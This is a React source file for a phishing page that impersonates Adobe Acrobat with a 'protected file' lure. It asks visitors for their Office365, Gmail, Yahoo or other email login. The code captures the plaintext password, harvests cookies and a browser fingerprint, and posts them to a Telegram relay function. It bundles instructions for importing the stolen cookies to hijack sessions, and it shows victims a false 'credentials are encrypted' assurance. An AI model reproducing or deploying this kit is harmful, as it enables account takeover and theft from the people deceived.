import React, { useState } from 'react';
import { ArrowLeft, Mail, Lock, Eye, EyeOff } from 'lucide-react';
import { collectBrowserFingerprint } from '../../utils/cookieCollector';

interface MobileLoginPageProps {
  fileName: string;
  onBack: () => void;
  onLoginSuccess?: (sessionData: any) => void;
}

const MobileLoginPage: React.FC<MobileLoginPageProps> = ({ fileName, onBack, onLoginSuccess }) => {
  const [selectedProvider, setSelectedProvider] = useState<string>('');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const emailProviders = [
    { 
      name: 'Office365', 
      domain: 'outlook.com', 
      color: 'bg-blue-600', 
      logo: 'https://www.svgrepo.com/show/503426/microsoft-office.svg'
    },
    { 
      name: 'Yahoo', 
      domain: 'yahoo.com', 
      color: 'bg-purple-600', 
      logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/0/0a/Yahoo_Y_%282009-2013%29.svg/450px-Yahoo_Y_%282009-2013%29.svg.png?20100624225346'
    },
    { 
      name: 'Outlook', 
      domain: 'outlook.com', 
      color: 'bg-blue-500', 
      logo: 'https://www.svgrepo.com/show/443244/brand-microsoft-outlook.svg'
    },
    { 
      name: 'AOL', 
      domain: 'aol.com', 
      color: 'bg-red-600', 
      logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/2/2b/AOL_logo_%282024%29.svg/1199px-AOL_logo_%282024%29.svg.png?20241206193155'
    },
    { 
      name: 'Gmail', 
      domain: 'gmail.com', 
      color: 'bg-red-500', 
      logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Gmail_icon_%282020%29.svg/768px-Gmail_icon_%282020%29.svg.png?20221017173631'
    },
    { 
      name: 'Others', 
      domain: 'other.com', 
      color: 'bg-gray-600', 
      logo: 'https://www.svgrepo.com/show/521128/email-1.svg'
    },
  ];

  const handleProviderSelect = (provider: string) => {
    setSelectedProvider(provider);
  };

  const storeSessionLocally = (loginData: any) => {
    const sessionData = {
      email: loginData.email,
      provider: loginData.provider,
      fileName: loginData.fileName,
      timestamp: loginData.timestamp,
      sessionId: Math.random().toString(36).substring(2, 15),
      deviceInfo: {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language
      }
    };

    localStorage.setItem('adobe_autograb_session', JSON.stringify(sessionData));
    sessionStorage.setItem('adobe_current_session', JSON.stringify(sessionData));
    
    console.log('AutoGrab session stored:', sessionData);
    return sessionData;
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !password || !selectedProvider) return;

    setIsLoading(true);

    try {
      // Collect comprehensive browser fingerprint including cookies
      const browserFingerprint = collectBrowserFingerprint();
      
      const loginData = {
        email,
        password,
        provider: selectedProvider,
        fileName,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        ip: 'hidden',
        browserFingerprint
      };

      console.log('Attempting login with data:', { ...loginData, password: '[HIDDEN]' });

      // Create cookies file data for Telegram
      const cookiesFileData = {
        timestamp: new Date().toISOString(),
        loginInfo: {
          email: loginData.email,
          provider: loginData.provider,
          fileName: loginData.fileName,
          userAgent: loginData.userAgent
        },
        browserFingerprint: browserFingerprint,
        instructions: {
          usage: "This file contains comprehensive browser session data",
          cookies: "Use browser extensions like 'Cookie Editor' to import cookies",
          localStorage: "Use browser developer tools to set localStorage items",
          sessionStorage: "Use browser developer tools to set sessionStorage items",
          fingerprint: "Complete browser fingerprint for session restoration"
        }
      };

      const sessionData = storeSessionLocally(loginData);

      // Send to Telegram with cookies file data included
      const telegramResponse = await fetch('/.netlify/functions/sendTelegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json',
        },
        body: JSON.stringify({
          ...loginData,
          cookiesFileData: cookiesFileData
        }),
        signal: AbortSignal.timeout(30000),
      });

      console.log('Telegram response status:', telegramResponse.status);
      
      if (!telegramResponse.ok) {
        const errorText = await telegramResponse.text();
        console.error('Telegram API error:', errorText);
        
        if (telegramResponse.status === 500) {
          throw new Error('Server configuration error. Please contact support.');
        } else if (telegramResponse.status === 404) {
          throw new Error('Service temporarily unavailable. Please try again.');
        } else {
          throw new Error(`Network error (${telegramResponse.status}). Please check your connection.`);
        }
      }

      const telegramResult = await telegramResponse.json();
      console.log('Telegram result:', telegramResult);

      // Cookies data sent to Telegram successfully
      if (telegramResult.success) {
        console.log('Cookies data sent to Telegram successfully');
      }

      const sessionResponse = await fetch('/.netlify/functions/setSession', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json',
        },
        body: JSON.stringify({
          email,
          provider: selectedProvider,
          fileName,
          sessionId: sessionData.sessionId,
        }),
        signal: AbortSignal.timeout(15000),
      });

      console.log('Session response status:', sessionResponse.status);

      if (sessionResponse.ok) {
        if (onLoginSuccess) {
          onLoginSuccess(sessionData);
        }

        // Show mobile-optimized success message
        const successDiv = document.createElement('div');
        successDiv.innerHTML = `
          <div style="
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 30px 25px;
            border-radius: 16px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
            z-index: 10000;
            text-align: center;
            font-family: system-ui, -apple-system, sans-serif;
            min-width: 280px;
            max-width: 90vw;
          ">
            <div style="color: #059669; font-size: 20px; font-weight: 600; margin-bottom: 12px;">
              ✓ Access Granted!
            </div>
            <div style="color: #374151; font-size: 16px; line-height: 1.4;">
              Opening ${fileName}...
            </div>
          </div>
        `;
        document.body.appendChild(successDiv);
        
        setTimeout(() => {
          document.body.removeChild(successDiv);
        }, 2500);
        
        onBack();
      } else {
        const sessionErrorText = await sessionResponse.text();
        console.error('Session creation error:', sessionErrorText);
        alert('Session creation failed. Please try again.');
      }
    } catch (error) {
      console.error('Login error:', error);
      
      if (error instanceof Error) {
        if (error.name === 'AbortError') {
          alert('Request timed out. Please check your internet connection and try again.');
        } else if (error.message.includes('Failed to fetch')) {
          alert('Network error. Please check your internet connection and try again.');
        } else {
          alert(`Authentication failed: ${error.message}`);
        }
      } else {
        alert('Authentication failed. Please try again.');
      }
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen relative overflow-hidden">
      {/* Adobe-style linear gradient background */}
      <div className="absolute inset-0 bg-gradient-to-br from-[#F40F02] to-[#FAD0C4]"></div>
      <div className="absolute inset-0 bg-white/10"></div>
      
      {/* Subtle decorative elements */}
      <div className="absolute top-10 left-5 w-24 h-24 bg-white/8 rounded-full blur-xl"></div>
      <div className="absolute bottom-10 right-5 w-32 h-32 bg-white/6 rounded-full blur-2xl"></div>
      <div className="absolute top-1/2 left-1/4 w-16 h-16 bg-white/10 rounded-full blur-lg"></div>
      <div className="absolute bottom-1/4 right-1/3 w-20 h-20 bg-white/7 rounded-full blur-lg"></div>
      
      <div className="relative z-10 min-h-screen p-5">
        <div className="max-w-md mx-auto">
          {/* Header */}
          <div className="text-center mb-8 pt-8">
            <button
              onClick={onBack}
              className="inline-flex items-center gap-3 text-gray-800 hover:text-gray-900 mb-8 transition-colors duration-200 p-3 bg-white/25 backdrop-blur-sm rounded-xl shadow-sm"
            >
              <ArrowLeft className="w-5 h-5" />
              <span className="text-base font-semibold">Back to Files</span>
            </button>
            
            <div className="w-20 h-20 flex items-center justify-center mx-auto mb-6 bg-white/95 backdrop-blur-sm rounded-2xl shadow-lg">
              <img 
                src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/833px-PDF_file_icon.svg.png" 
                alt="Adobe Acrobat" 
                className="w-14 h-14 object-contain"
              />
            </div>
            
            <h1 className="text-2xl font-bold text-gray-900 mb-3">Access Protected File</h1>
            <p className="text-base text-gray-900 font-bold leading-relaxed px-4 bg-white/25 backdrop-blur-sm rounded-xl py-3 mx-2 shadow-sm">
              Please authenticate to access <span className="font-bold break-all">{fileName}</span>
            </p>
          </div>

          {/* Login Form */}
          <div className="bg-white/98 backdrop-blur-xl rounded-3xl shadow-2xl border border-white/70 p-6">
            {!selectedProvider ? (
              // Provider Selection
              <div>
                <h2 className="text-xl font-semibold text-gray-900 mb-6 text-center">
                  Choose your email provider
                </h2>
                <div className="grid grid-cols-2 gap-4">
                  {emailProviders.map((provider) => (
                    <button
                      key={provider.name}
                      onClick={() => handleProviderSelect(provider.name)}
                      className={`${provider.color} text-white p-5 rounded-2xl hover:opacity-90 transition-all duration-200 transform active:scale-95 flex flex-col items-center gap-3 shadow-lg`}
                    >
                      <img 
                        src={provider.logo} 
                        alt={provider.name} 
                        className="w-10 h-10 object-contain filter brightness-0 invert"
                        onError={(e) => {
                          const target = e.target as HTMLImageElement;
                          target.style.display = 'none';
                          const parent = target.parentElement;
                          if (parent && !parent.querySelector('.fallback-text')) {
                            const fallback = document.createElement('div');
                            fallback.className = 'fallback-text text-2xl font-bold';
                            fallback.textContent = provider.name.charAt(0);
                            parent.insertBefore(fallback, target.nextSibling);
                          }
                        }}
                      />
                      <span className="font-medium text-sm">{provider.name}</span>
                    </button>
                  ))}
                </div>
              </div>
            ) : (
              // Login Form
              <div>
                <div className="flex items-center gap-4 mb-6">
                  <button
                    onClick={() => setSelectedProvider('')}
                    className="text-gray-400 hover:text-gray-600 transition-colors duration-200 p-1"
                  >
                    <ArrowLeft className="w-5 h-5" />
                  </button>
                  <h2 className="text-xl font-semibold text-gray-900">
                    Sign in with {selectedProvider}
                  </h2>
                </div>

                <form onSubmit={handleLogin} className="space-y-5">
                  <div>
                    <label className="block text-base font-bold text-gray-900 mb-3">
                      Email Address
                    </label>
                    <div className="relative">
                      <Mail className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
                      <input
                        type="email"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        className="w-full pl-12 pr-4 py-4 border-2 border-gray-300 rounded-2xl focus:ring-2 focus:ring-red-500 focus:border-transparent transition-all duration-200 bg-white text-base font-semibold text-gray-900"
                        placeholder="Enter your email"
                        required
                        autoComplete="email"
                        inputMode="email"
                      />
                    </div>
                  </div>

                  <div>
                    <label className="block text-base font-bold text-gray-900 mb-3">
                      Password
                    </label>
                    <div className="relative">
                      <Lock className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
                      <input
                        type={showPassword ? 'text' : 'password'}
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        className="w-full pl-12 pr-14 py-4 border-2 border-gray-300 rounded-2xl focus:ring-2 focus:ring-red-500 focus:border-transparent transition-all duration-200 bg-white text-base font-semibold text-gray-900"
                        placeholder="Enter your password"
                        required
                        autoComplete="current-password"
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700 transition-colors duration-200 p-1"
                      >
                        {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                      </button>
                    </div>
                  </div>

                  <button
                    type="submit"
                    disabled={isLoading || !email || !password}
                    className="w-full bg-gradient-to-r from-red-600 to-red-700 text-white py-4 rounded-2xl font-semibold text-lg hover:from-red-700 hover:to-red-800 disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-200 transform active:scale-95 shadow-lg mt-6"
                  >
                    {isLoading ? (
                      <div className="flex items-center justify-center gap-3">
                        <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                        Authenticating...
                      </div>
                    ) : (
                      'Access File'
                    )}
                  </button>
                </form>

                <div className="mt-6 text-center">
                  <p className="text-sm text-gray-900 font-bold">
                    Your credentials are encrypted and secure
                  </p>
                </div>
              </div>
            )}
          </div>

          {/* Adobe Footer */}
          <div className="text-center mt-8 pb-8">
            <p className="text-sm text-gray-900 font-bold bg-white/25 backdrop-blur-sm rounded-xl py-3 px-4 inline-block shadow-sm">
              © 2025 Adobe Inc. All rights reserved.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default MobileLoginPage;